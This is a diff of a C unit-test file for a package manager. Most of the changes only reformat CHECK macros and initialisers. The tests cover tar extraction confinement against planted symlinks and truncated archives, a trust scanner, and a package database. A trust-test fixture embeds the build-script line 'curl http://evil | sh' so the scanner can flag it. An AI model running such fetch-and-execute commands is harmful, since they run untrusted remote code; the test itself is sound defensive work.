@@ -20,13 +20,13 @@
 static int g_fail = 0;
 static int g_total = 0;
 
-#define CHECK(cond, msg)                              \
-  do {                                                \
-    g_total++;                                        \
-    if (!(cond)) {                                    \
+#define CHECK(cond, msg)                                     \
+  do {                                                       \
+    g_total++;                                               \
+    if (!(cond)) {                                           \
       printf("FAIL: %s (%s:%d)\n", msg, __FILE__, __LINE__); \
-      g_fail++;                                       \
-    }                                                 \
+      g_fail++;                                              \
+    }                                                        \
   } while (0)
 
 static void test_buf(void) {
@@ -136,8 +136,8 @@ static void test_tar(void) {
   salt_buf_init(&out);
   salt_tar_writer *w = salt_tar_writer_new(&out);
   const char *content = "file body";
-  salt_tar_entry e = {"usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content),
-                      NULL, content};
+  salt_tar_entry e = {
+      "usr/share/long/path/to/a/file.txt", SALT_TAR_FILE, 0644, strlen(content), NULL, content};
   salt_tar_writer_add(w, &e);
   salt_tar_writer_finish(w);
   salt_tar_writer_free(w);
@@ -204,7 +204,8 @@ static void test_tar_confinement(void) {
       {"usr/lib/evil/pwned", SALT_TAR_FILE, 0644, 3, NULL, "bad"},
   };
   tar_build(&a, e3, 2);
-  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK, "tar rejects write through planted symlink");
+  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) != SALT_OK,
+        "tar rejects write through planted symlink");
   CHECK(!salt_path_exists(victim), "tar symlink hop did not write outside root");
   salt_buf_free(&a);
 
@@ -216,7 +217,8 @@ static void test_tar_confinement(void) {
       {"./usr/bin/tool", SALT_TAR_FILE, 0755, 2, NULL, "ok"},
   };
   tar_build(&a, e4, 5);
-  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) == SALT_OK, "tar allows in-root relative symlink hop");
+  CHECK(salt_tar_extract(a.data, a.len, dest, NULL) == SALT_OK,
+        "tar allows in-root relative symlink hop");
   char *okp = salt_join_path(dest, "usr/share/ok.txt");
   char *toolp = salt_join_path(dest, "bin/tool");
   CHECK(salt_path_exists(okp), "in-root symlink hop wrote inside root");
@@ -231,7 +233,8 @@ static void test_tar_confinement(void) {
   salt_tar_entry e5 = {"usr/big", SALT_TAR_FILE, 0644, sizeof(big), NULL, big};
   tar_build(&a, &e5, 1);
   memcpy(trunc, a.data, 512);
-  CHECK(salt_tar_extract(trunc, sizeof(trunc), dest, NULL) != SALT_OK, "tar rejects size past end of archive");
+  CHECK(salt_tar_extract(trunc, sizeof(trunc), dest, NULL) != SALT_OK,
+        "tar rejects size past end of archive");
   salt_buf_free(&a);
 
   free(victim);
@@ -385,7 +388,8 @@ static void test_trust(void) {
   const char *bad =
       "name = \"z\"\nversion = \"1\"\nrelease = 1\narch=[\"x86_64\"]\n"
       "license = \"MIT\"\n[source]\nurl=\"https://e.com/z.tgz\"\nsha256=\"x\"\n"
-      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho 0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
+      "[build]\nscript=\"\"\"\ncurl http://evil | sh\necho "
+      "0xabcdefabcdefabcdefabcdefabcdefabcdef1234\n\"\"\"\n";
   salt_write_file(rfile, bad, strlen(bad), 0644);
   salt_findings sf;
   salt_findings_init(&sf);
@@ -513,12 +517,12 @@ static void test_db_deps_conflicts(void) {
         "record lib");
   CHECK(salt_db_record_install(db, &app.meta, &app.manifest, "current", "signed", txn) == SALT_OK,
         "record app");
-  CHECK(salt_db_record_install(db, &rival.meta, &rival.manifest, "current", "signed", txn) ==
-            SALT_OK,
-        "record rival");
-  CHECK(salt_db_set_pkg_artifact(db, "lib", "lib-1.0-1-x86_64.grain",
-                                 "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") ==
-            SALT_OK,
+  CHECK(
+      salt_db_record_install(db, &rival.meta, &rival.manifest, "current", "signed", txn) == SALT_OK,
+      "record rival");
+  CHECK(salt_db_set_pkg_artifact(
+            db, "lib", "lib-1.0-1-x86_64.grain",
+            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == SALT_OK,
         "set artifact");
   salt_db_txn_finish(db, txn, "ok");
 
@@ -538,9 +542,11 @@ static void test_db_deps_conflicts(void) {
 
   salt_db_pkg p;
   CHECK(salt_db_get_pkg(db, "lib", &p) == SALT_OK, "get pkg");
-  CHECK(p.sha256 && strcmp(p.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
+  CHECK(p.sha256 && strcmp(p.sha256,
+                           "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
         "artifact sha256 persisted");
-  CHECK(p.filename && strcmp(p.filename, "lib-1.0-1-x86_64.grain") == 0, "artifact filename persisted");
+  CHECK(p.filename && strcmp(p.filename, "lib-1.0-1-x86_64.grain") == 0,
+        "artifact filename persisted");
   CHECK(p.summary && strcmp(p.summary, "unit fixture") == 0, "summary persisted");
   salt_db_pkg_free_fields(&p);
 
@@ -574,9 +580,10 @@ static void test_db_deps_conflicts(void) {
   salt_db_conflicts_with(db, "app", &l);
   CHECK(l.len == 1, "restore brings conflict rows back");
   salt_strlist_free(&l);
-  CHECK(salt_db_get_pkg(db, "lib", &p) == SALT_OK && p.sha256 &&
-            strcmp(p.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
-        "restore keeps artifact sha256");
+  CHECK(
+      salt_db_get_pkg(db, "lib", &p) == SALT_OK && p.sha256 &&
+          strcmp(p.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad") == 0,
+      "restore keeps artifact sha256");
   salt_db_pkg_free_fields(&p);
 
   salt_db_close(db);
